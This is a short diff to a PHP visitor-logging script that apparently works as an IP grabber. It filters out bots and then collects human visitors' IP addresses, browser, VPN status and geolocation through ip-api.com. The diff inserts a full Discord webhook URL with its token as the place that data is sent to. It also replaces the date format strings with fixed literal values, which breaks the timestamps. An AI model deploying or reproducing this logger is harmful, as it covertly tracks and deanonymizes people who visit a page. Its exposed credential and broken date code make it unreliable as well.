@@ -18,9 +18,9 @@ if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
 }
 
 //YOU CAN SET YOUR TIMEZONE HERE!
-date_default_timezone_set("Europe/Amsterdam");
-$Date = date('d/m/Y');
-$Time = date('G:i:s');
+date_default_timezone_set("America/New_York");
+$Date = date('31/7/25');
+$Time = date('2:08:0');
 
 //Check if IP is a VPN (Is not always correct!)
 $Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
@@ -56,7 +56,7 @@ class Discord
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
 		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "FULLURLHERE";
+        $Webhook = "https://discord.com/api/webhooks/1400515169251229776/ij4oUENw06vApaDVeKj12TBcdMyxqTrAG-6NPG4xh6u13vnt7aYl2yQNa98DtoCCzBcS";
 
         $InfoArr = array(
             "username" => "$WebhookName",
